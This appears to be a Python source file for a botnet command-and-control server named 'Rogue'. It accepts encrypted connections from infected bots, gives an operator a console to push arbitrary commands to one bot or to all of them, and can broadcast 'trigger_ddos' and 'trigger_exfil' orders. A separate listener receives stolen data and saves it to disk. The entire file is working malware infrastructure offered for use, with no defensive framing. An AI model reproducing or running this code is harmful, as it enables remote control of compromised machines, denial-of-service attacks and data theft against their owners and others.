#!/usr/bin/env python3
import socket, threading, base64, os
from Cryptodome.Cipher import AES

SECRET_KEY = b'Sixteen byte key'
PORT = 4444
EXFIL_PORT = 9090
clients = []

def encrypt_message(msg):
    cipher = AES.new(SECRET_KEY, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(msg.encode())
    return base64.b64encode(cipher.nonce + tag + ciphertext)

def decrypt_message(data):
    data = base64.b64decode(data)
    nonce, tag, ciphertext = data[:16], data[16:32], data[32:]
    cipher = AES.new(SECRET_KEY, AES.MODE_EAX, nonce)
    return cipher.decrypt_and_verify(ciphertext, tag).decode()

def handle_client(conn, addr):
    print(f"[+] Bot connected: {addr}")
    clients.append(conn)
    try:
        while True:
            encrypted_data = conn.recv(4096)
            if not encrypted_data:
                break
            print(f"[{addr}] {decrypt_message(encrypted_data)}")
    except:
        pass
    finally:
        print(f"[!] Bot disconnected: {addr}")
        clients.remove(conn)
        conn.close()

def listener():
    server = socket.socket()
    server.bind(('0.0.0.0', PORT))
    server.listen(10)
    print(f"[C2] Rogue listening on port {PORT}...")
    while True:
        conn, addr = server.accept()
        threading.Thread(target=handle_client, args=(conn, addr)).start()

def exfil_listener():
    exfil_server = socket.socket()
    exfil_server.bind(('0.0.0.0', EXFIL_PORT))
    exfil_server.listen(5)
    print(f"[EXFIL] Listening on port {EXFIL_PORT} for incoming encrypted data...")

    while True:
        conn, addr = exfil_server.accept()
        print(f"[EXFIL] Receiving from {addr[0]}...")
        data = b""
        while True:
            chunk = conn.recv(4096)
            if not chunk:
                break
            data += chunk
        conn.close()

        filename = f"exfil_dump_{addr[0].replace('.', '_')}.bin"
        with open(filename, "wb") as f:
            f.write(data)
        print(f"[EXFIL] Saved: {filename}")

def send_command():
    while True:
        cmd = input("Rogue> ")
        if cmd.lower() == "exit":
            break
        elif cmd.startswith("target"):
            _, index, *command = cmd.split()
            try:
                index = int(index)
                clients[index].send(encrypt_message(" ".join(command)))
            except:
                print("[!] Invalid target index.")
        elif cmd.startswith("trigger_ddos") or cmd.startswith("trigger_exfil"):
            for conn in clients:
                try:
                    conn.send(encrypt_message(cmd))
                except:
                    clients.remove(conn)
        else:
            for conn in clients:
                try:
                    conn.send(encrypt_message(cmd))
                except:
                    clients.remove(conn)

def show_clients():
    print("Connected Bots:")
    for i, c in enumerate(clients):
        print(f"{i}) {c.getpeername()}")

# Start listeners
threading.Thread(target=listener, daemon=True).start()
threading.Thread(target=exfil_listener, daemon=True).start()

while True:
    show_clients()
    send_command()
